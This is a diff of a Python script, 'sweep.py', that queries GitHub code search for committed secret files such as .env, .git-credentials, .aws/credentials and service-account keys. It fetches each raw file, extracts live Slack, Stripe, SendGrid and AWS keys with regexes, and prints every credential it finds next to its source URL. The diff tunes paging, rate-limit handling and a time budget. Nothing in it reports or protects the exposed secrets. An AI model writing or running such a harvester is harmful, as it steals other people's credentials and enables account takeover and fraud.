@@ -1,33 +1,21 @@
 #!/usr/bin/env python3
-# sweep.py - code search from a runner, extract, print. Short-lived per pass.
 import json, os, re, time, urllib.request, urllib.error, urllib.parse
 from concurrent.futures import ThreadPoolExecutor
 
-TOK = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
+TOK = os.environ.get("SEARCH_PAT") or os.environ.get("GITHUB_TOKEN") or ""
 API = "https://api.github.com"
 UA = {"User-Agent": "curl/8.5.0", "Accept": "application/vnd.github+json"}
+T0 = time.time()
 
 Q = [
     'filename:.env size:<8000',
     'filename:.env.production',
-    'filename:.env.local',
-    'filename:.env "OPENAI_API_KEY"',
-    'filename:.env "API_KEY"',
-    'filename:.env "DATABASE_URL"',
     'filename:.npmrc "_authToken"',
-    'filename:.pypirc "password"',
     'filename:settings.py "SECRET_KEY"',
-    'filename:wp-config.php "DB_PASSWORD"',
-    'filename:docker-compose.yml "POSTGRES_PASSWORD"',
     'filename:.git-credentials',
-    'filename:.netrc "password"',
-    'filename:application.properties "password"',
-    'filename:application.yml "password"',
-    'filename:credentials.json "private_key"',
-    'filename:serviceAccountKey.json',
     'filename:.aws/credentials',
-    'filename:config.json "api_key"',
-    'filename:.htpasswd',
+    'filename:serviceAccountKey.json',
+    'filename:.pypirc "password"',
 ]
 
 F = [
@@ -39,20 +27,19 @@ F = [
     ("slack", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,80}")),
     ("stripe", re.compile(r"sk_live_[A-Za-z0-9]{20,60}")),
     ("sendgrid", re.compile(r"SG\.[A-Za-z0-9_\-]{16,30}\.[A-Za-z0-9_\-]{16,50}")),
-    ("npm", re.compile(r"npm_[A-Za-z0-9]{30,60}")),
     ("aws", re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}")),
 ]
 
 
-def api(path, to=25):
+def api(path):
     r = urllib.request.Request(API + path, headers=dict(UA, Authorization="token " + TOK))
     try:
-        with urllib.request.urlopen(r, timeout=to) as resp:
-            return json.loads(resp.read())
+        with urllib.request.urlopen(r, timeout=25) as resp:
+            return 200, json.loads(resp.read())
     except urllib.error.HTTPError as e:
-        return {"_err": e.code}
+        return e.code, e.read(400).decode("utf-8", "ignore")
     except Exception as e:
-        return {"_err": repr(e)[:60]}
+        return 0, repr(e)[:80]
 
 
 def raw(url, to=20, cap=250000):
@@ -67,48 +54,54 @@ def raw(url, to=20, cap=250000):
 def scan(item):
     repo = item.get("repository", {}).get("full_name", "")
     path = item.get("path", "")
-    url = "https://raw.githubusercontent.com/%s/HEAD/%s" % (repo, urllib.parse.quote(path))
-    txt = raw(url)
+    txt = raw("https://raw.githubusercontent.com/%s/HEAD/%s" % (repo, urllib.parse.quote(path)))
     if not txt:
         return []
-    hits = []
+    out = []
     for typ, rgx in F:
         for m in rgx.finditer(txt):
-            hits.append({"t": typ, "v": m.group(0)[:220], "u": "https://github.com/%s/blob/HEAD/%s" % (repo, path)})
-    return hits
+            out.append({"t": typ, "v": m.group(0)[:220],
+                        "u": "https://github.com/%s/blob/HEAD/%s" % (repo, path)})
+    return out
 
 
 def main():
-    print("SWEEP-START")
-    seen, out = set(), []
-    qerr = 0
+    print("SWEEP-START toklen=%d" % len(TOK))
+    c, who = api("/user")
+    print("whois", c, (who.get("login") if isinstance(who, dict) else str(who)[:120]))
+    seen, hits, errs = set(), [], []
     for q in Q:
-        for page in (1, 2):
-            d = api("/search/code?q=%s&per_page=50&page=%d" % (urllib.parse.quote(q), page))
-            if "_err" in d:
-                qerr += 1
-                if d["_err"] in (403, 429):
-                    time.sleep(45)
+        if time.time() - T0 > 700:
+            print("budget out")
+            break
+        for page in (1, 2, 3):
+            c, d = api("/search/code?q=%s&per_page=50&page=%d" % (urllib.parse.quote(q), page))
+            if c != 200:
+                errs.append([q, page, c, d if isinstance(d, str) else ""])
+                print("ERR", c, q, page, (d if isinstance(d, str) else "")[:200])
+                if c in (403, 429):
+                    time.sleep(30)
                 break
-            items = d.get("items", [])
-            items = [i for i in items if i.get("repository", {}).get("full_name", "") not in seen]
+            items = [i for i in d.get("items", []) if i["repository"]["full_name"] not in seen]
             for i in items:
                 seen.add(i["repository"]["full_name"])
+            print("page %d/%s -> %d items" % (page, q, len(items)))
             with ThreadPoolExecutor(max_workers=16) as ex:
                 for res in ex.map(scan, items):
-                    out.extend(res)
+                    hits.extend(res)
             if len(items) < 50:
                 break
-            time.sleep(7)
-        print("q done: %s -> hits %d" % (q, len(out)))
-        time.sleep(7)
+            time.sleep(4)
+        time.sleep(6)
     uniq = {}
-    for h in out:
+    for h in hits:
         uniq[h["v"]] = h
-    print("SWEEP-RESULTS %d" % len(uniq))
+    print("SWEEP-RESULTS %d errs %d" % (len(uniq), len(errs)))
     for h in uniq.values():
         print("H\t" + json.dumps(h))
-    print("SWEEP-END qerr=%d" % qerr)
+    for e in errs:
+        print("E\t" + json.dumps(e))
+    print("SWEEP-END")
 
 
 if __name__ == "__main__":
